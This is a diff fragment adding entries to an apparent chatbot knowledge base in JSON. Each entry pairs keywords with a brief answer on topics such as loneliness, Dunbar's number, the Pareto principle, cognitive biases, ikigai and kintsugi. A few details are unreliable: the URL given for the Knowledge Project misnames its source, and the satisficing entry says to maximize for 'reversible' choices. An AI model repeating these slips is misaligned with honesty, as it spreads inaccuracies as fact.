+        "loneliness epidemic",
+        "social isolation",
+        "loneliness health"
+      ],
+      "answer": "Loneliness: chronic feeling of being unwanted/isolated. Rates rising in developed nations, especially among young men. Health effects comparable to smoking. Surgeon General called it a public health emergency (2023). Causes: declining community/religious participation, smaller households, suburbs/cars, social media displacement of in-person contact. Counter: prioritize in-person time, weak ties (chats with strangers) also matter."
+    },
+    {
+      "keywords": [
+        "weak ties",
+        "granovetter",
+        "weak ties hypothesis"
+      ],
+      "answer": "Strength of weak ties (Granovetter, 1973): weak ties (acquaintances, distant connections) are often more useful than strong ties (family, close friends) for jobs, new information, ideas \u2014 because they reach into different networks. Strong ties tend to know what you know. Practical: nurture weak ties (LinkedIn, neighbors, conferences). Cassandra Speller's update: weak ties matter most for moderate-level moves; strong ties for major support."
+    },
+    {
+      "keywords": [
+        "dunbar number",
+        "dunbar",
+        "150 friends"
+      ],
+      "answer": "Dunbar's number: ~150 \u2014 the cognitive limit on stable social relationships. Based on neocortex size correlation with primate group sizes. Inner circles within: ~5 (intimate), ~15 (sympathy), ~50 (good friends), ~150 (community), ~500 (acquaintance), ~1500 (recognized). Used in military units, congregation sizes, company structures. Critics argue the limit is fuzzier; concept is still a useful heuristic."
+    },
+    {
+      "keywords": [
+        "habits compound",
+        "small habits",
+        "tiny gains"
+      ],
+      "answer": "1% better every day for a year = 37x better; 1% worse = nearly nothing. Compounding works in habits too. Implication: small consistent practices outperform sporadic intense ones over years. Counterintuitive because daily change is invisible \u2014 must trust the math. Patience and consistency are the rare assets."
+    },
+    {
+      "keywords": [
+        "pareto principle",
+        "80 20",
+        "pareto rule"
+      ],
+      "answer": "Pareto principle (80/20): roughly 80% of effects come from 20% of causes. Originally observed in Italian land ownership. Approximate, not law \u2014 sometimes 90/10 or 70/30. Useful prompt: 'what's the 20% that drives 80% of value here?' \u2014 focus there. Common applications: top customers driving revenue, top features causing bugs, top tasks driving career impact."
+    },
+    {
+      "keywords": [
+        "second order thinking",
+        "first order",
+        "systems thinking"
+      ],
+      "answer": "Second-order thinking: 'and then what?' \u2014 consider consequences of consequences. First-order: 'price ceiling on rent \u2192 cheaper rent.' Second-order: 'and then less new construction, more deferred maintenance, worse housing supply long-term.' Most people stop at first-order. Practice with chess, history, anything systemic. Pair with humility \u2014 you can't see all orders."
+    },
+    {
+      "keywords": [
+        "mental models",
+        "models",
+        "charlie munger"
+      ],
+      "answer": "Mental models: simplified frameworks for understanding reality. Munger advocates collecting a 'latticework' of models from multiple disciplines (physics, biology, psychology, math, economics) \u2014 apply the best one to each problem. Examples: inversion (think backward), opportunity cost, second-order effects, confirmation bias, regression to the mean, Occam's razor. shanepatrick.com/the-knowledge-project lists many."
+    },
+    {
+      "keywords": [
+        "asymmetric bets",
+        "optionality",
+        "barbell strategy"
+      ],
+      "answer": "Asymmetric bets: outcomes where downside is bounded and upside is large. Nassim Taleb's barbell strategy: 90% in extreme safety (cash, Treasuries), 10% in maximally risky positive-skew bets (startups, options). Avoid the middle (moderate-risk medium-return stuff). Apply to career: stable income + a side project that could explode. The world is more bimodal than people pretend."
+    },
+    {
+      "keywords": [
+        "expected value",
+        "ev decision",
+        "probability times outcome"
+      ],
+      "answer": "Expected value (EV): probability \u00d7 outcome, summed over outcomes. 50% to win $100, 50% to lose $50: EV = +$25. Make decisions based on EV when you can repeat the bet many times. But: variance matters when bet can't be repeated (life-ruining downside is not OK even at positive EV). Kelly criterion: optimal bet size given edge. Most life decisions: estimate roughly, decide directionally."
+    },
+    {
+      "keywords": [
+        "sunk cost fallacy",
+        "sunk costs",
+        "wasted investment"
+      ],
+      "answer": "Sunk cost fallacy: continuing because of past investment, not future expected value. 'I've already spent $1000 on this PhD \u2014 gotta finish' (ignores the next year's cost). 'I've put 5 years into this job \u2014 can't switch now.' Counter: each decision is forward-looking. Past expenditure is irrelevant except as evidence of future. Hardest to apply to relationships and career; easiest to see in others'."
+    },
+    {
+      "keywords": [
+        "confirmation bias",
+        "confirm bias",
+        "cherry picking"
+      ],
+      "answer": "Confirmation bias: seeking and weighting information that confirms existing beliefs, ignoring or discounting disconfirming evidence. Pervasive \u2014 affects experts too. Counters: actively seek disconfirmation, steelman opposing views, write down predictions and audit later, surround yourself with people who push back. Twitter/social media massively amplify confirmation bias via algorithmic personalization."
+    },
+    {
+      "keywords": [
+        "survivor bias",
+        "survivorship",
+        "survival bias"
+      ],
+      "answer": "Survivorship bias: focus on survivors (successes), ignoring those who didn't make it. WWII airplane example: armor where surviving planes were hit \u2260 where to add armor (those planes survived hits there \u2014 armor the parts of NON-returners). Applied: studying habits of successful CEOs/founders without controlling for unsuccessful ones with same habits. Most success advice is survivorship-biased; pair with failure case studies."
+    },
+    {
+      "keywords": [
+        "fundamental attribution error",
+        "fae",
+        "attribution error"
+      ],
+      "answer": "Fundamental attribution error: attribute others' behavior to character ('he's a jerk') and our own to situation ('I was stressed'). Reduces empathy and obscures real causes. Counter: assume situational factors first for others; ask 'what would make a reasonable person do this?'. Especially important in management, debate, relationships."
+    },
+    {
+      "keywords": [
+        "dunning kruger",
+        "dunning-kruger effect",
+        "incompetence confidence"
+      ],
+      "answer": "Dunning-Kruger effect: less competent people overestimate their competence; experts may underestimate (or know how much they don't know). Original study was specific; popular interpretation overgeneralized. Useful frame: novices don't know enough to know they don't know. Counter: surface knowledge of your own gaps, seek feedback, defer to people deeper in a domain."
+    },
+    {
+      "keywords": [
+        "ikigai",
+        "japanese purpose",
+        "reason for being"
+      ],
+      "answer": "Ikigai (\u751f\u304d\u7532\u6590): Japanese concept, 'reason for being'. Popular Western diagram intersects what you love, what you're good at, what the world needs, what you can be paid for \u2014 but that 4-circle version is a Western invention, not traditional Japanese. Original ikigai: smaller daily reasons to get up (a garden, family routine, craft). Use either, but don't pressure yourself to find one grand answer."
+    },
+    {
+      "keywords": [
+        "amor fati",
+        "love of fate",
+        "nietzsche"
+      ],
+      "answer": "Amor fati ('love of fate'): love what happens, including hardship \u2014 not just endure but embrace as raw material for growth. Nietzsche made it famous; Stoic precursors. Not toxic positivity (denying pain) \u2014 full acceptance plus deliberate engagement. 'My formula for greatness in a human being is amor fati.' (Nietzsche, Ecce Homo)"
+    },
+    {
+      "keywords": [
+        "memento mori",
+        "remember death",
+        "death meditation"
+      ],
+      "answer": "Memento mori ('remember you must die'): contemplating mortality clarifies priorities. Stoic exercise; Christian tradition; Buddhist practice. Counter to denial-of-death culture. Practical: yearly mortality calendar (weeks left if average lifespan), 'this could be your last X' reframe. Not morbid \u2014 used right, makes life more vivid and aligned. Steve Jobs's Stanford commencement reflected this."
+    },
+    {
+      "keywords": [
+        "wabi sabi",
+        "japanese aesthetic",
+        "imperfect beauty"
+      ],
+      "answer": "Wabi-sabi (\u4f98\u5bc2): Japanese aesthetic \u2014 beauty in imperfection, impermanence, and incompleteness. A worn wooden bowl, asymmetric pottery, autumn leaves, an old garden. Counter to Western perfectionism and shine. Applies to design, gardens, tea ceremony, daily life. Influences modern minimalism though often misappropriated."
+    },
+    {
+      "keywords": [
+        "kintsugi",
+        "golden repair",
+        "japanese pottery"
+      ],
+      "answer": "Kintsugi (\u91d1\u7d99\u304e): Japanese art of repairing broken pottery with lacquer mixed with powdered gold. Makes the cracks visible and beautiful \u2014 embraces history rather than hiding damage. Metaphor for human resilience: scars as part of the story, not flaws to conceal. Several modern adaptations: kintsugi-inspired therapy, art, jewelry."
+    },
+    {
+      "keywords": [
+        "good enough",
+        "satisficing",
+        "perfect enemy of good"
+      ],
+      "answer": "Satisficing (Herbert Simon): pick the first option that meets criteria, vs maximizing (search for best). For most decisions, satisficing is better \u2014 perfect is the enemy of done, and search costs are real. Maximizers tend to be less satisfied even with objectively better outcomes (more regret of paths not taken). Pick maximize for rare/important/reversible choices; satisfice everywhere else."
+    },
+    {
+      "keywords": [
+        "essentialism",
+        "greg mckeown",
+        "essentialism book"
+      ],
+      "answer": "Essentialism (Greg McKeown): disciplined pursuit of less. Most things don't matter; identify the few that do and put energy there. 'If it isn't a clear yes, it's a clear no.' Saying no is the active skill. Distinguish trivial many from vital few. Pair with stoicism, slow productivity, JOMO. Counter to: 'do everything', 'work hard on all fronts', FOMO-driven scattering."
     }
   ]
 }
